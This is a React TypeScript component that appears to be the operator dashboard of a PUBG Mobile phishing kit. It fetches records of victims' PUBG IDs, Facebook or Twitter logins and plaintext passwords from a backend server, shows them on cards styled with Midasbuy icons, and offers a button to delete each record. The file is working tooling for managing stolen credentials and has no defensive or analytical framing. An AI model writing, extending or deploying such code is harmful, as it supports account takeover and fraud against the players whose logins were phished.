import React, { useEffect, useState } from "react";
import "./App.css";
import axios from "axios";

interface IData {
  data: {
    _id: string;
    pubgId: string;
    login: string;
    password: string;
    socialSite: string;
    isLoading: boolean;
  }[];
}

function App() {
  const [data, setData] = useState<IData["data"]>();

  const API = axios.create({ baseURL: "https://pubg-mobile.onrender.com" });

  const getInfo = async () => {
    try {
      const { data } = await API.get<IData["data"]>("/api/information");
      setData(data);
    } catch (err) {
      console.log(err);
    }
  };

  const deleteInfo = async (id: string) => {
    try {
      // Create a new array with updated loading state for the clicked item
      setData((prevData) => {
        return prevData?.map((item) => {
          if (item._id === id) {
            return { ...item, isLoading: true };
          }
          return item;
        });
      });

      await API.delete(`/api/information/remove/${id}`);
      getInfo();
    } catch (err) {
      console.log(err);
    }
  };

  useEffect(() => {
    getInfo();
  }, []);

  return (
    <div
      className="App"
      style={{
        display: "flex",
        flexDirection: "column",
        gap: "5px",
        margin: "10px",
      }}
    >
      {data?.map((item) => (
        <div
          key={item._id}
          style={{
            maxWidth: "200px",
            border: "1px solid cyan",
            borderRadius: "10px",
            gap: "5px",
            padding: "5px",
          }}
        >
          <div style={{ display: "flex", gap: "5px", alignItems: "center" }}>
            <p style={{ color: "red" }}>Network</p>
            {item.socialSite === "fb" ? (
              <img
                width={25}
                height={25}
                src="https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb-new.png"
                alt=""
              />
            ) : (
              <img
                width={25}
                height={25}
                src="https://cdn.midasbuy.com/images/twitter.80d9b5e6.png"
                alt=""
              />
            )}
          </div>
          <div style={{ display: "flex", gap: "5px" }}>
            <p style={{ color: "red" }}>PUBG ID</p>
            <p>{item.pubgId}</p>
          </div>
          <div style={{ display: "flex", gap: "5px" }}>
            <p style={{ color: "red" }}>Login</p>
            <p>{item.login}</p>
          </div>
          <div style={{ display: "flex", gap: "5px" }}>
            <p style={{ color: "red" }}>Password</p>
            <p>{item.password}</p>
          </div>
          <button
            style={{
              border: "none",
              backgroundImage: "linear-gradient(120deg, red 0%, #f5576c 100%)",
              padding: "5px 20px",
              borderRadius: "6px",
              color: "white",
            }}
            onClick={() => deleteInfo(item._id)}
            disabled={item.isLoading} // Disable button while loading
          >
            {item.isLoading && (
              <img width={20} src="https://i.gifer.com/ZKZg.gif" alt="" />
            )}
            {!item.isLoading && "Delete"}
          </button>
        </div>
      ))}
    </div>
  );
}

export default App;
